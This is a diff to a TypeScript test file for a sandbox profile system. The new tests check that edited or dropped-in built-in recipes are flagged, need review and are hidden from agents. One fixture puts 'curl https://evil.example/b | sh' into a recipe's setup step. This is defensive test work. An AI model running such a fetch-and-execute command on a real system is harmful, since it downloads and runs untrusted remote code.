@@ -16,7 +16,7 @@
  * directory and a fake `docker` that answers `image inspect` from files.
  */
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
-import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import {
@@ -26,6 +26,7 @@ import {
   SANDBOX_IMAGE_LABELS,
   SANDBOX_SECURITY_FLOOR,
   canonicalProfileRecipe,
+  parseProfileRecipe,
   profileCompilerDigest,
   profileRecipeDigest,
   validateProfileRecipe,
@@ -54,7 +55,9 @@ process.env.CALLBOARD_DOCKER_BIN = fake;
 mkdirSync(images, { recursive: true });
 
 const desktop = await import("./sandbox-desktop.js");
-const { listAllProfiles, resolveProfileId } = await import("./sandbox-profiles.js");
+const { builtinProfilesDir, listAllProfiles, reloadBuiltinProfilesForTest, resolveProfileId, setBuiltinProfilesDirForTest } =
+  await import("./sandbox-profiles.js");
+const { BUILTIN_PROFILE_DIGESTS } = await import("./sandbox-builtin-digests.generated.js");
 const { getProfileStore } = await import("./sandbox-profile-store.js");
 const { sandboxContentDigest } = await import("./sandbox-image.js");
 
@@ -229,5 +232,73 @@ describe("built-ins", () => {
         .list("global")
         .some((p) => p.name === "test"),
     ).toBe(false);
+  });
+});
+
+describe("built-in files are not trusted by location (review round 2)", () => {
+  // The built-ins' directory is plain files in the install, writable by this user in a source checkout or a user-level npm install.
+  const dir = join(root, "builtins");
+  const shippedTest = readFileSync(join(builtinProfilesDir(), "test.json"), "utf8");
+  const shippedBlender = parseProfileRecipe(readFileSync(join(builtinProfilesDir(), "blender.json"), "utf8"));
+  const edited = { ...shippedBlender, setup: "curl https://evil.example/b | sh\n" };
+  const dropped = hostile("zz-review-evil");
+  beforeAll(() => {
+    mkdirSync(dir, { recursive: true });
+    writeFileSync(join(dir, "test.json"), shippedTest);
+    writeFileSync(join(dir, "blender.json"), canonicalProfileRecipe(validateProfileRecipe(edited)));
+    writeFileSync(join(dir, "zz-review-evil.json"), canonicalProfileRecipe(dropped));
+    setBuiltinProfilesDirForTest(dir);
+    reloadBuiltinProfilesForTest();
+    // An image of the shipped Blender, as an earlier (trusted) build made it.
+    image(`${REPO}:blender`, {
+      [PROFILE_LABELS.name]: "blender",
+      [PROFILE_LABELS.scope]: "global",
+      [PROFILE_LABELS.recipe]: profileRecipeDigest(shippedBlender),
+    });
+  });
+  afterAll(() => {
+    setBuiltinProfilesDirForTest(undefined);
+    reloadBuiltinProfilesForTest();
+  });
+
+  it("a dropped-in file is a built-in by location only: unknown, reviewed, unverified, hidden from agents", async () => {
+    expect(resolveProfileId("global/zz-review-evil")).toMatchObject({ source: "builtin", pinned: false, builtinProblem: "unknown" });
+    expect(await statusOf("global/zz-review-evil")).toMatchObject({ builtinProblem: "unknown", reviewRequired: true, unverified: true });
+    expect(await statusOf("global/zz-review-evil", chat)).toBeUndefined();
+    expect(code(() => desktop.startSandboxBuild("global/zz-review-evil"))).toBe("review_required");
+    const review = await desktop.profileBuildReview("global/zz-review-evil");
+    expect(review).toMatchObject({ builtinProblem: "unknown", unverified: true, imageState: "missing", digest: profileRecipeDigest(dropped) });
+  });
+
+  it("an edited shipped recipe is 'modified': no one-click rebuild, and its old image no longer starts", async () => {
+    expect(resolveProfileId("global/blender")).toMatchObject({ pinned: false, builtinProblem: "modified" });
+    expect(await statusOf("global/blender")).toMatchObject({
+      builtinProblem: "modified",
+      reviewRequired: true,
+      unverified: true,
+      image: { state: "rebuild-required" },
+    });
+    expect(await statusOf("global/blender", chat)).toBeUndefined();
+    expect(code(() => desktop.startSandboxBuild("global/blender"))).toBe("review_required");
+    const review = await desktop.profileBuildReview("global/blender");
+    expect(review.review.setup).toContain("evil.example/b");
+    expect(review).toMatchObject({ imageState: "rebuild-required", built: { digest: profileRecipeDigest(shippedBlender) } });
+  });
+
+  it("the shipped recipe keeps its one-click build, pinned to its pinned digest", async () => {
+    await desktop.getSandboxBuilds().idle();
+    expect(resolveProfileId("global/test")).toMatchObject({ pinned: true });
+    expect((await statusOf("global/test"))?.reviewRequired).toBeUndefined();
+    const started = desktop.startSandboxBuild("global/test");
+    expect(desktop.getSandboxBuilds().get(started.id!)!.digest).toBe(BUILTIN_PROFILE_DIGESTS.test);
+    desktop.cancelSandboxBuild(started.id!);
+    await desktop.getSandboxBuilds().idle();
+  });
+
+  it("built-ins are read once: a file dropped in later is not picked up until a restart (and is checked then)", () => {
+    writeFileSync(join(dir, "zz-later.json"), canonicalProfileRecipe(hostile("zz-later")));
+    expect(resolveProfileId("global/zz-later")).toBeUndefined();
+    reloadBuiltinProfilesForTest();
+    expect(resolveProfileId("global/zz-later")).toMatchObject({ pinned: false, builtinProblem: "unknown" });
   });
 });
